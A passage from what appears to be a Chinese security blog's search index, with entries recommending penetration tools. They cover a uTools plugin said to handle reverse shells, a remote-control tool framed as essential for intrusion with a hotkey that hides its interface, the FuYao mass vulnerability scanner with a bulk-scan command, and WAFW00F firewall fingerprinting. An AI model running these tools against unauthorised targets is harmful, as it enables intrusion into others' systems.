href="https://www.u.tools/docs/guide/about-uTools.html#%E5%9C%BA%E6%99%AF-15-%E5%90%AF%E5%8A%A8%E8%BD%AF%E4%BB%B6"></a></h3><p>通过中文、拼音或拼音首字母快速启动软件。</p><p><img src="https://res.u-tools.cn/docs/about-uTools-02.png" alt="微信"></p><h3 id="场景-16：搜索系统设置"><a href="#场景-16：搜索系统设置" class="headerlink" title="场景 16：搜索系统设置"></a>场景 16：搜索系统设置<a href="https://www.u.tools/docs/guide/about-uTools.html#%E5%9C%BA%E6%99%AF-16-%E6%90%9C%E7%B4%A2%E7%B3%BB%E7%BB%9F%E8%AE%BE%E7%BD%AE"></a></h3><p>再也不用通过点击一步一步地找到设置选项了，一键直达。</p><p><img src="https://res.u-tools.cn/docs/about-uTools-03.png" alt="蓝牙"></p><p><img src="https://res.u-tools.cn/docs/about-uTools-04.png" alt="触摸板"></p><h2 id="四、跨平台兼容性"><a href="#四、跨平台兼容性" class="headerlink" title="四、跨平台兼容性"></a>四、跨平台兼容性<a href="https://www.u.tools/docs/guide/about-uTools.html#%E5%9B%9B%E3%80%81%E8%B7%A8%E5%B9%B3%E5%8F%B0%E5%85%BC%E5%AE%B9%E6%80%A7"></a></h2><p>uTools 支持 Windows、macOS 和 Linux 操作系统，这意味着用户可以在不同的操作系统上使用相同的工具和插件，保持一致的工作流程。</p><p>对于需要在不同环境下工作的用户，这种跨平台的兼容性尤为重要，它确保了用户可以在任何设备上都能高效地完成工作。</p><h2 id="插件名称"><a href="#插件名称" class="headerlink" title="插件名称:"></a>插件名称:</h2><h4 id="加密与解密"><a href="#加密与解密" class="headerlink" title="加密与解密"></a>加密与解密</h4><p>支持：各种加解密，反弹shell等。</p><p>详情：</p><p><img src="https://pic.imgdb.cn/item/662624810ea9cb14037d0cd4.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>神级别的远控工具-渗透必备的远控工具</title>
      <link href="/2024/04/21/45-%E8%BF%9C%E7%A8%8B/"/>
      <url>/2024/04/21/45-%E8%BF%9C%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="版本：RdViewer-Pro-Lite"><a href="#版本：RdViewer-Pro-Lite" class="headerlink" title="版本：RdViewer Pro Lite"></a>版本：RdViewer Pro Lite</h1><p>一款支持自建服务器的免费远控神器</p><h2 id="V6-6-8版本更新"><a href="#V6-6-8版本更新" class="headerlink" title="V6.6.8版本更新"></a>V6.6.8版本更新</h2><p>1、界面显示优化</p><p>2、提高屏幕性能和稳定性，屏幕工具栏支持拖动</p><p>3、改进客户端安装、卸载功能</p><p>4、升级备注功能</p><p>5、改进和提升软件性能</p><h2 id="软件特点："><a href="#软件特点：" class="headerlink" title="软件特点："></a>软件特点：</h2><p>1、高清、流畅的远程屏幕，超低的内存使用，cpu占用近乎为0，性能最好。</p><p>2、窗口界面大小随意调，支持窗口记忆功能。</p><p>3、屏幕支持文件拖上传、下载，支持剪切板共享，支持沉浸式全屏模式。</p><p>4、详细的上线信息显示，支持实时设备检索、排序、分组和批量管理。</p><p>5、windows全平台支持,WinXP，Win7~Win11均可使用。</p><p>6、TCP/UDP双驱混合传输技术，支持硬件加速和内网直连。</p><p>7、支持自建服务器，自建节点，支持互联网部署和纯内网部署使用。</p><h2 id="支持系统和环境："><a href="#支持系统和环境：" class="headerlink" title="支持系统和环境："></a>支持系统和环境：</h2><p>WinXp-Win11所有操作系统，互联网和局域网均可部署。</p><p>软件包：<a href="https://rdviewer.oss-cn-hangzhou.aliyuncs.com/app/RdViewerPro.zip">https://rdviewer.oss-cn-hangzhou.aliyuncs.com/app/RdViewerPro.zip</a></p><p>安卓：<a href="https://rdviewer.oss-cn-hangzhou.aliyuncs.com/app/RdViewer.apk">https://rdviewer.oss-cn-hangzhou.aliyuncs.com/app/RdViewer.apk</a></p><p>苹果：<a href="https://apps.apple.com/cn/app/rdviewer/id1541109277">https://apps.apple.com/cn/app/rdviewer/id1541109277</a></p><h2 id="实用技巧："><a href="#实用技巧：" class="headerlink" title="实用技巧："></a>实用技巧：</h2><p>1、屏幕管理支持文件拖上传和拖下载，支持文本共享复制和粘贴。</p><p>2、管理端ctrl+l 隐藏、显示界面。</p><p>3、软件配置可在管理端界面顶部的设置按钮打开。</p><p><a href="https://user-images.githubusercontent.com/69678347/176330704-066dfd0d-379b-4ff3-8fa4-42c238fee69d.png"><img src="https://user-images.githubusercontent.com/69678347/176330704-066dfd0d-379b-4ff3-8fa4-42c238fee69d.png" alt="image"></a> <a href="https://user-images.githubusercontent.com/69678347/208793930-98c8e0e8-69db-4599-ae67-a13b8866c88c.png"><img src="https://user-images.githubusercontent.com/69678347/208793930-98c8e0e8-69db-4599-ae67-a13b8866c88c.png" alt="image"></a></p>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FuYao-大批量自动扫描漏洞</title>
      <link href="/2024/04/04/1FuYao-%E5%A4%A7%E6%89%B9%E9%87%8F%E6%89%AB%E6%8F%8F/"/>
      <url>/2024/04/04/1FuYao-%E5%A4%A7%E6%89%B9%E9%87%8F%E6%89%AB%E6%8F%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="FuYao-Go-扶摇直上九万里-不再开源-维护中…"><a href="#FuYao-Go-扶摇直上九万里-不再开源-维护中…" class="headerlink" title="FuYao - Go 扶摇直上九万里 - 不再开源 维护中…"></a>FuYao - Go 扶摇直上九万里 - 不再开源 维护中…</h1><p><a href="https://github.com/ExpLangcn/FuYao-Go">https://github.com/ExpLangcn/FuYao-Go</a></p><h4 id="😄-I’m-ExpLang-Twitter-欢迎关注fo～"><a href="#😄-I’m-ExpLang-Twitter-欢迎关注fo～" class="headerlink" title="😄 I’m ExpLang Twitter 欢迎关注fo～"></a>😄 I’m ExpLang <a href="https://twitter.com/ExpLang_Cn"><strong>Twitter</strong></a> 欢迎关注fo～</h4><h2 id="问题反馈-漏洞列表"><a href="#问题反馈-漏洞列表" class="headerlink" title="问题反馈|漏洞列表"></a><a href="https://github.com/ExpLangcn/FuYao-Go/issues">问题反馈</a>|<a href="https://github.com/ExpLangcn/FuYao-Go/blob/main/README.md#%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8">漏洞列表</a></h2><p><strong>自动化进行目标资产探测和安全漏洞扫描｜适用于赏金活动、SRC活动、大规模使用、大范围使用|通过使用被动在线资源来发现网站的有效子域｜使用零误报的定制模板向目标发送请求，同时可以对大量主机进行快速扫描。｜提供TCP、DNS、HTTP、FILE等各类协议的扫描，通过强大且灵活的模板，模拟各种安全检查</strong></p><p><a href="https://user-images.githubusercontent.com/52586866/168596909-c0f95cff-1460-4af7-8d4a-7e5afde3f30e.png"><img src="https://user-images.githubusercontent.com/52586866/168596909-c0f95cff-1460-4af7-8d4a-7e5afde3f30e.png" alt="image"></a></p><p><a href="https://user-images.githubusercontent.com/52586866/168596925-b2a50a21-df0a-433d-8424-cd2d5386b5be.png"><img src="https://user-images.githubusercontent.com/52586866/168596925-b2a50a21-df0a-433d-8424-cd2d5386b5be.png" alt="image"></a></p><h2 id="法律免责声明"><a href="#法律免责声明" class="headerlink" title="法律免责声明"></a>法律免责声明</h2><p>本工具仅面向合法授权的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。 在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。 如果发现上述禁止行为，我们将保留追究您法律责任的权利。</p><p>如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任. 您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</p><hr><h3 id="更新记录"><a href="#更新记录" class="headerlink" title="更新记录"></a>更新记录</h3><p><strong>2022.6.6 14.59</strong></p><ul><li>新增Hunter网络测绘扫描</li><li>新增 <code>-p</code> 参数 可以指定漏洞文件夹（采用xray漏洞模版,如果直接拿过来，语言name改为id ,Details改为 info,不支持cache ）</li></ul><p><strong>2022.5.16 20:45</strong></p><ul><li>发布V1.3.2版本</li><li>修复个别情况无法进行Shodan扫描</li><li>新增Quake资产获取</li><li>优化存活验证逻辑</li><li>新增端口探测（探测完子域名后会进行存活探测，存活探测的同时会进行端口探测）</li><li>优化输出信息</li><li>新增新版本检查（在启动LOGO上可以看到最新版本）</li></ul><p><strong>2022.5.11 12:10</strong></p><ul><li>发布V1.3版本</li><li>子域名探测效率提升</li><li>新增自动FoFa资产探测</li><li>新增自动Shodan资产探测</li><li>更换漏洞库和验证库 - <a href="https://github.com/ExpLangcn/FuYao-Go">Afrog</a></li><li>新增指纹探测识别</li></ul><p><strong>2022.4.15 17:10</strong></p><ul><li>发布V1.1版本</li><li>修复Windows下 file missing [file=MANIFEST-000000] 错误</li><li>修复Windows下 no valid templates were found 报错</li><li>优化扫描并发配置</li></ul><p><strong>2022.4.15 12:00</strong></p><ul><li>发布 v1.0版本</li></ul><hr><h3 id="当前功能-or-未来功能"><a href="#当前功能-or-未来功能" class="headerlink" title="当前功能 or 未来功能"></a>当前功能 or 未来功能</h3><ul><li>子域名枚举资产收集</li><li>批量子域名枚举资产收集</li><li>Chaos 资产收集</li><li>资产存活验证</li><li>批量资产存活验证</li><li>安全漏洞验证</li><li>批量安全漏洞验证</li><li>子域名枚举资产收集、资产存活验证、安全漏洞扫描联动</li><li>FoFa自动资产探测</li><li>Shodan自动资产探测</li><li>Web指纹探测识别</li><li>网络空间测绘资产收集</li><li>中间件漏洞利用例：shiro、SpringBoot等…</li><li>Hunter自动资产探测</li><li>子域名存活WebHook通知</li><li>安全漏洞扫描结果WebHook通知</li><li>待定…</li></ul><p><strong>有需要什么功能的话可以在 <a href="https://github.com/ExpLangcn/FuYao-Go/issues">issues</a> 提</strong></p><hr><h3 id="当前POC列表"><a href="#当前POC列表" class="headerlink" title="当前POC列表"></a>当前POC列表</h3><h4 id="点击查看详情"><a href="#点击查看详情" class="headerlink" title="点击查看详情"></a><a href="https://github.com/ExpLangcn/FuYao-Go/blob/main/README.md#%E6%BC%8F%E6%B4%9E%E5%88%97%E8%A1%A8">点击查看详情</a></h4><p>当前总共有：<strong>549个POC模版</strong></p><p><a href="https://user-images.githubusercontent.com/52586866/167674307-3a3e39f9-3a76-4132-ba23-7bff624307e3.png"><img src="https://user-images.githubusercontent.com/52586866/167674307-3a3e39f9-3a76-4132-ba23-7bff624307e3.png" alt="image"></a></p><hr><h3 id="使用帮助"><a href="#使用帮助" class="headerlink" title="使用帮助"></a>使用帮助</h3><h4 id="不推荐使用Windows系统！"><a href="#不推荐使用Windows系统！" class="headerlink" title="不推荐使用Windows系统！"></a>不推荐使用Windows系统！</h4><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">./mark/FuYao_Intel/FuYao_Intel -h                                                                                                                                                                          FuYao_test</span><br><span class="line">  ███████╗██╗   ██╗██╗   ██╗ █████╗  ██████╗</span><br><span class="line">  ██╔════╝██║   ██║╚██╗ ██╔╝██╔══██╗██╔═══██╗</span><br><span class="line">  █████╗  ██║   ██║ ╚████╔╝ ███████║██║   ██║</span><br><span class="line">  ██╔══╝  ██║   ██║  ╚██╔╝  ██╔══██║██║   ██║  Version: V1.3</span><br><span class="line">  ██║     ╚██████╔╝   ██║   ██║  ██║╚██████╔╝  Author: ExpLang</span><br><span class="line">  ╚═╝      ╚═════╝    ╚═╝   ╚═╝  ╚═╝ ╚═════╝   Discord: ExpLang#6666</span><br><span class="line">     Github:github.com/ExpLangcn/FuYao-Go</span><br><span class="line"> 使用FuYao前请遵守当地法律,FuYao仅提供给教育行为使用</span><br><span class="line"></span><br><span class="line"> 法律免责声明</span><br><span class="line">  本工具仅面向合法授权的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。</span><br><span class="line">  在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。</span><br><span class="line">  如果发现上述禁止行为，我们将保留追究您法律责任的权利。</span><br><span class="line"></span><br><span class="line">  如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任.</span><br><span class="line">  您的使用行为或者您以其他任何明示或者默示方式表示接受本协议的，即视为您已阅读并同意本协议的约束。</span><br><span class="line"></span><br><span class="line">Usage of ./mark/FuYao_Intel/FuYao_Intel:</span><br><span class="line">  -f string</span><br><span class="line">        指定根域目标文件 ｜ 支持绝对路径和相对路径</span><br></pre></td></tr></tbody></table></figure><p><strong>自动化信息搜集+漏洞扫描</strong>(目标文件内的目标是一行一个，并且必须是主域名)</p><blockquote><p>./FuYao -f list.txt</p></blockquote><hr><h3 id="配置信息"><a href="#配置信息" class="headerlink" title="配置信息"></a>配置信息</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FoFa:</span><br><span class="line">  email: ""</span><br><span class="line">  key: ""</span><br><span class="line">Shodan:</span><br><span class="line">  key: ""</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 工具推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透工具推荐 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>帮你识别目标防火墙的工具</title>
      <link href="/2024/04/01/31-WAFW00F-%E9%98%B2%E7%81%AB%E5%A2%99/"/>
      <url>/2024/04/01/31-WAFW00F-%E9%98%B2%E7%81%AB%E5%A2%99/</url>
      
        <content type="html"><![CDATA[<h2 id="它是如何工作的？"><a href="#它是如何工作的？" class="headerlink" title="它是如何工作的？"></a>它是如何工作的？</h2><p>github:<a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p><p>为了发挥其魔力，WAFW00F 执行以下操作：</p><ul><li>发送<em>正常的</em>HTTP请求并分析响应；这确定了许多 WAF 解决方案。</li><li>如果不成功，它会发送许多（可能是恶意的）HTTP 请求，并使用简单的逻辑来推断它是哪个 WAF。</li><li>如果也不成功，它会分析之前返回的响应，并使用另一种简单的算法来猜测 WAF 或安全解决方案是否正在积极响应我们的攻击。</li></ul><p><a href="https://github.com/EnableSecurity/wafw00f">有关更多详细信息，请查看我们的主存储库</a>上的源代码。</p><h2 id="它检测到什么？"><a href="#它检测到什么？" class="headerlink" title="它检测到什么？"></a>它检测到什么？</h2><p>WAFW00F可以检测多种防火墙，列表如下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><span class="line">$ wafw00f -l</span><br><span class="line"></span><br><span class="line">                   ______</span><br><span class="line">                  /      \</span><br><span class="line">                 (  Woof! )</span><br><span class="line">                  \  ____/                      )</span><br><span class="line">                  ,,                           ) (_</span><br><span class="line">             .-. -    _______                 ( |__|</span><br><span class="line">            ()``; |==|_______)                .)|__|</span><br><span class="line">            / ('        /|\                  (  |__|</span><br><span class="line">        (  /  )        / | \                  . |__|</span><br><span class="line">         \(_)_))      /  |  \                   |__|</span><br><span class="line"></span><br><span class="line">                    ~ WAFW00F : v2.2.0 ~</span><br><span class="line">    The Web Application Firewall Fingerprinting Toolkit</span><br><span class="line"></span><br><span class="line">[+] Can test for these WAFs:</span><br><span class="line"></span><br><span class="line">  WAF Name                        Manufacturer</span><br><span class="line">  --------                        ------------</span><br><span class="line"></span><br><span class="line">  ACE XML Gateway                  Cisco</span><br><span class="line">  aeSecure                         aeSecure</span><br><span class="line">  AireeCDN                         Airee</span><br><span class="line">  Airlock                          Phion/Ergon</span><br><span class="line">  Alert Logic                      Alert Logic</span><br><span class="line">  AliYunDun                        Alibaba Cloud Computing</span><br><span class="line">  Anquanbao                        Anquanbao</span><br><span class="line">  AnYu                             AnYu Technologies</span><br><span class="line">  Approach                         Approach</span><br><span class="line">  AppWall                          Radware</span><br><span class="line">  Armor Defense                    Armor</span><br><span class="line">  ArvanCloud                       ArvanCloud</span><br><span class="line">  ASP.NET Generic                  Microsoft</span><br><span class="line">  ASPA Firewall                    ASPA Engineering Co.</span><br><span class="line">  Astra                            Czar Securities</span><br><span class="line">  AWS Elastic Load Balancer        Amazon</span><br><span class="line">  AzionCDN                         AzionCDN</span><br><span class="line">  Azure Front Door                 Microsoft</span><br><span class="line">  Barikode                         Ethic Ninja</span><br><span class="line">  Barracuda                        Barracuda Networks</span><br><span class="line">  Bekchy                           Faydata Technologies Inc.</span><br><span class="line">  Beluga CDN                       Beluga</span><br><span class="line">  BIG-IP Local Traffic Manager     F5 Networks</span><br><span class="line">  BinarySec                        BinarySec</span><br><span class="line">  BitNinja                         BitNinja</span><br><span class="line">  BlockDoS                         BlockDoS</span><br><span class="line">  Bluedon                          Bluedon IST</span><br><span class="line">  BulletProof Security Pro         AITpro Security</span><br><span class="line">  CacheWall                        Varnish</span><br><span class="line">  CacheFly CDN                     CacheFly</span><br><span class="line">  Comodo cWatch                    Comodo CyberSecurity</span><br><span class="line">  CdnNS Application Gateway        CdnNs/WdidcNet</span><br><span class="line">  ChinaCache Load Balancer         ChinaCache</span><br><span class="line">  Chuang Yu Shield                 Yunaq</span><br><span class="line">  Cloudbric                        Penta Security</span><br><span class="line">  Cloudflare                       Cloudflare Inc.</span><br><span class="line">  Cloudfloor                       Cloudfloor DNS</span><br><span class="line">  Cloudfront                       Amazon</span><br><span class="line">  CrawlProtect                     Jean-Denis Brun</span><br><span class="line">  DataPower                        IBM</span><br><span class="line">  DenyALL                          Rohde &amp; Schwarz CyberSecurity</span><br><span class="line">  Distil                           Distil Networks</span><br><span class="line">  DOSarrest                        DOSarrest Internet Security</span><br><span class="line">  DotDefender                      Applicure Technologies</span><br><span class="line">  DynamicWeb Injection Check       DynamicWeb</span><br><span class="line">  Edgecast                         Verizon Digital Media</span><br><span class="line">  Eisoo Cloud Firewall             Eisoo</span><br><span class="line">  Expression Engine                EllisLab</span><br><span class="line">  BIG-IP AppSec Manager            F5 Networks</span><br><span class="line">  BIG-IP AP Manager                F5 Networks</span><br><span class="line">  Fastly                           Fastly CDN</span><br><span class="line">  FirePass                         F5 Networks</span><br><span class="line">  FortiWeb                         Fortinet</span><br><span class="line">  GoDaddy Website Protection       GoDaddy</span><br><span class="line">  Greywizard                       Grey Wizard</span><br><span class="line">  Huawei Cloud Firewall            Huawei</span><br><span class="line">  HyperGuard                       Art of Defense</span><br><span class="line">  Imunify360                       CloudLinux</span><br><span class="line">  Incapsula                        Imperva Inc.</span><br><span class="line">  IndusGuard                       Indusface</span><br><span class="line">  Instart DX                       Instart Logic</span><br><span class="line">  ISA Server                       Microsoft</span><br><span class="line">  Janusec Application Gateway      Janusec</span><br><span class="line">  Jiasule                          Jiasule</span><br><span class="line">  Kona SiteDefender                Akamai</span><br><span class="line">  KS-WAF                           KnownSec</span><br><span class="line">  KeyCDN                           KeyCDN</span><br><span class="line">  LimeLight CDN                    LimeLight</span><br><span class="line">  LiteSpeed                        LiteSpeed Technologies</span><br><span class="line">  Open-Resty Lua Nginx             FLOSS</span><br><span class="line">  Oracle Cloud                     Oracle</span><br><span class="line">  Malcare                          Inactiv</span><br><span class="line">  MaxCDN                           MaxCDN</span><br><span class="line">  Mission Control Shield           Mission Control</span><br><span class="line">  ModSecurity                      SpiderLabs</span><br><span class="line">  NAXSI                            NBS Systems</span><br><span class="line">  Nemesida                         PentestIt</span><br><span class="line">  NevisProxy                       AdNovum</span><br><span class="line">  NetContinuum                     Barracuda Networks</span><br><span class="line">  NetScaler AppFirewall            Citrix Systems</span><br><span class="line">  Newdefend                        NewDefend</span><br><span class="line">  NexusGuard Firewall              NexusGuard</span><br><span class="line">  NinjaFirewall                    NinTechNet</span><br><span class="line">  NullDDoS Protection              NullDDoS</span><br><span class="line">  NSFocus                          NSFocus Global Inc.</span><br><span class="line">  OnMessage Shield                 BlackBaud</span><br><span class="line">  Palo Alto Next Gen Firewall      Palo Alto Networks</span><br><span class="line">  PerimeterX                       PerimeterX</span><br><span class="line">  PentaWAF                         Global Network Services</span><br><span class="line">  pkSecurity IDS                   pkSec</span><br><span class="line">  PT Application Firewall          Positive Technologies</span><br><span class="line">  PowerCDN                         PowerCDN</span><br><span class="line">  Profense                         ArmorLogic</span><br><span class="line">  Puhui                            Puhui</span><br><span class="line">  Qcloud                           Tencent Cloud</span><br><span class="line">  Qiniu                            Qiniu CDN</span><br><span class="line">  Qrator                           Qrator</span><br><span class="line">  Reblaze                          Reblaze</span><br><span class="line">  RSFirewall                       RSJoomla!</span><br><span class="line">  RequestValidationMode            Microsoft</span><br><span class="line">  Sabre Firewall                   Sabre</span><br><span class="line">  Safe3 Web Firewall               Safe3</span><br><span class="line">  Safedog                          SafeDog</span><br><span class="line">  Safeline                         Chaitin Tech.</span><br><span class="line">  SecKing                          SecKing</span><br><span class="line">  eEye SecureIIS                   BeyondTrust</span><br><span class="line">  SecuPress WP Security            SecuPress</span><br><span class="line">  SecureSphere                     Imperva Inc.</span><br><span class="line">  Secure Entry                     United Security Providers</span><br><span class="line">  SEnginx                          Neusoft</span><br><span class="line">  ServerDefender VP                Port80 Software</span><br><span class="line">  Shield Security                  One Dollar Plugin</span><br><span class="line">  Shadow Daemon                    Zecure</span><br><span class="line">  SiteGround                       SiteGround</span><br><span class="line">  SiteGuard                        Sakura Inc.</span><br><span class="line">  Sitelock                         TrueShield</span><br><span class="line">  SonicWall                        Dell</span><br><span class="line">  UTM Web Protection               Sophos</span><br><span class="line">  Squarespace                      Squarespace</span><br><span class="line">  SquidProxy IDS                   SquidProxy</span><br><span class="line">  StackPath                        StackPath</span><br><span class="line">  Sucuri CloudProxy                Sucuri Inc.</span><br><span class="line">  Tencent Cloud Firewall           Tencent Technologies</span><br><span class="line">  Teros                            Citrix Systems</span><br><span class="line">  Trafficshield                    F5 Networks</span><br><span class="line">  TransIP Web Firewall             TransIP</span><br><span class="line">  URLMaster SecurityCheck          iFinity/DotNetNuke</span><br><span class="line">  URLScan                          Microsoft</span><br><span class="line">  UEWaf                            UCloud</span><br><span class="line">  Varnish                          OWASP</span><br><span class="line">  Viettel                          Cloudrity</span><br><span class="line">  VirusDie                         VirusDie LLC</span><br><span class="line">  Wallarm                          Wallarm Inc.</span><br><span class="line">  WatchGuard                       WatchGuard Technologies</span><br><span class="line">  WebARX                           WebARX Security Solutions</span><br><span class="line">  WebKnight                        AQTRONIX</span><br><span class="line">  WebLand                          WebLand</span><br><span class="line">  RayWAF                           WebRay Solutions</span><br><span class="line">  WebSEAL                          IBM</span><br><span class="line">  WebTotem                         WebTotem</span><br><span class="line">  West263 CDN                      West263CDN</span><br><span class="line">  Wordfence                        Defiant</span><br><span class="line">  WP Cerber Security               Cerber Tech</span><br><span class="line">  WTS-WAF                          WTS</span><br><span class="line">  360WangZhanBao                   360 Technologies</span><br><span class="line">  XLabs Security WAF               XLabs</span><br><span class="line">  Xuanwudun                        Xuanwudun</span><br><span class="line">  Yundun                           Yundun</span><br><span class="line">  Yunsuo                           Yunsuo</span><br><span class="line">  Yunjiasu                         Baidu Cloud Computing</span><br><span class="line">  YXLink                           YxLink Technologies</span><br><span class="line">  Zenedge                          Zenedge</span><br><span class="line">  ZScaler                          Accenture</span><br></pre></td></tr></tbody></table></figure><h2 id="我该如何使用它？"><a href="#我该如何使用它？" class="headerlink" title="我该如何使用它？"></a>我该如何使用它？</h2><p><a href="https://github.com/EnableSecurity/wafw00f#how-do-i-install-it">首先，按照此处</a>所述安装工具。</p><p>如需帮助，您可以使用该<code>--help</code>选项。基本用法是将 URL 作为参数传递。例子：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$   wafw00f https://example.org</span><br><span class="line"></span><br><span class="line">                   ______</span><br><span class="line">                  /      \</span><br><span class="line">                 (  Woof! )</span><br><span class="line">                  \  ____/                      )</span><br><span class="line">                  ,,                           ) (_</span><br><span class="line">             .-. -    _______                 ( |__|</span><br><span class="line">            ()``; |==|_______)                .)|__|</span><br><span class="line">            / ('        /|\                  (  |__|</span><br><span class="line">        (  /  )        / | \                  . |__|</span><br><span class="line">         \(_)_))      /  |  \                   |__|</span><br><span class="line"></span><br><span class="line">                    ~ WAFW00F : v2.2.0 ~</span><br><span class="line">    The Web Application Firewall Fingerprinting Toolkit</span><br><span class="line"></span><br><span class="line">[*] Checking https://example.org</span><br><span class="line">[+] The site https://example.org is behind Edgecast (Verizon Digital Media) WAF.</span><br><span class="line">[~] Number of requests: 2</span><br></pre></td></tr></tbody></table></figure><h2 id="我该如何安装它？"><a href="#我该如何安装它？" class="headerlink" title="我该如何安装它？"></a>我该如何安装它？</h2><p>以下应该可以解决问题：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 